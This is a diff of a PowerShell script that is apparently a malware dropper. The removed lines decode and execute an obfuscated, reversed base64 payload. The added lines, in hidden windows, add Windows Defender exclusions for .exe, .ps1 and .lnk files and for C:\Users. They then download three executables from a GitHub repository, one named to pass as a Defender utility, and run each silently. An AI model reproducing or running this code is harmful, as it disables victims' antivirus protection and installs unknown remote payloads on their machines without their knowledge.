@@ -1,4 +1,13 @@
-$best64code = "==gCNoQDlhXZuUWbhdGXzJXZzVFX6MEIuVGZklGSgcXLgUGel5CbsVGazJXZ39GcK0QZ4VmLl1WYnx1cyV2cVxlODBybtASZ4VmLl1WYn9ibpFWbvcXYy9Cd192LwkTZkVncv02bj5iY1hGdpd2LvozcwRHdoBCIpJXdtAic3lGIzNXYwlnYgAXZtAiblRGZphEIlxWe0N3dvRmbpdVLgwGblh2cyV2dvBnCNoQDlhXZukGbhtGXzJXZzVFX6MEIuVGZklGSgcXLgUGel5CbsVGazJXZ39GcK0QZ4VmLpxWYrx1cyV2cVxlODBybtASZ4VmL1QTN08VZjlGdjFmcw9VZrFmZv4Wah12L3FmcvQXdv9CM5UGZ1J3Lt92YuIWdoRXan9yL6MHc0RHagASayVXLgI3dpByczFGc5JGIwVWLg4WZkRWaIBSZslHdzd3bk5WaX1CIsxWZoNncld3bwpQDK0QZ4VmL5RXaslGd19lbvlGdjVGdvJHUfJXZk5WZmVGRcNnclNXVcpzQg4WZkRWaIBydtASZ4VmLsxWZoNncld3bwpQDK0QZ4VmL5RXaslGd19lbvlGdjVGdvJHUfJXZk5WZmVGRcNnclNXVcpzQg8WLgUGel5Se0lGbpRXdwITJu9Wa0NWZ09mcQBjMlkGdsVXTwITJyVGZuVmZlREMyUCdm92cvJ3Yp10LulWYt9ydhJ3L0V3bvATOlRWdy9SbvNmLiVHa0l2Zv8iOzBHd0hGIgkmc11CIydXagM3chBXeiBCcl1CIuVGZklGSgUGb5R3c39GZul2VtACbsVGazJXZ39GcK0gCNUGel5iclN3dvJnQcNnclNXVcpzQg4WZkRWaIBydtASZ4VmLsxWZoNncld3bwpQDlhXZuIXZzd3byJEXzJXZzVFX6MEIv1CIlhXZuIXZzd3byJ0LulWYt9ydhJ3L0V3bvATOlRWdy9SbvNmLiVHa0l2Zv8iOzBHd0hGIgkmc11CIydXagM3chBXeiBCcl1CIuVGZklGSgUGb5R3c39GZul2VtACbsVGazJXZ39GcK0gIzJXZzVFX6MkIggGdhBlbvl2c1x2Y4VULgU2YuVmclZWZyBFcN1CZkFEIuVGZklGSgUGb5R3c39GZul2VtACbsVGazJXZ39GcK0gIr5GbuICIu9Waz5WZ0hXRu9WazVHbjhXRtASZj5WZyVmZlJHUw1ULkRWQg4WZkRWaIBSZslHdzd3bk5WaX1CIsxWZoNncld3bwpQDiEzcw5iIg42bpNnblRHeF52bpNXdsNGeF1CIlNmblJXZmVmcQBXTtQGZBBiblRGZphEIlxWe0N3dvRmbpdVLgwGblh2cyV2dvBnCNISZ4VmLiAibvl2cuVGd4Vkbvl2c1x2Y4VULgU2YuVmclZWZyBFcN1CZkFEIuVGZklGSgUGb5R3c39GZul2VtACbsVGazJXZ39Gc"
-$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null
-$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64"))
-Invoke-Expression $LoadCode
+powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".exe"
+powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".ps1"
+powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
+powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"
+
+powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/game.exe -o C:\Users\Public\game.exe
+powershell.exe -w Hidden C:\Users\Public\game.exe
+
+powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Browser.exe -o C:\Users\Browser.exe
+powershell.exe -w Hidden C:\Users\Browser.exe
+
+powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Microsoft%20Defender%20Multi%20Protection%20utility.exe -o C:\Users\Defender_Protection_utility.exe
+powershell.exe -w Hidden C:\Users\Defender_Protection_utility.exe
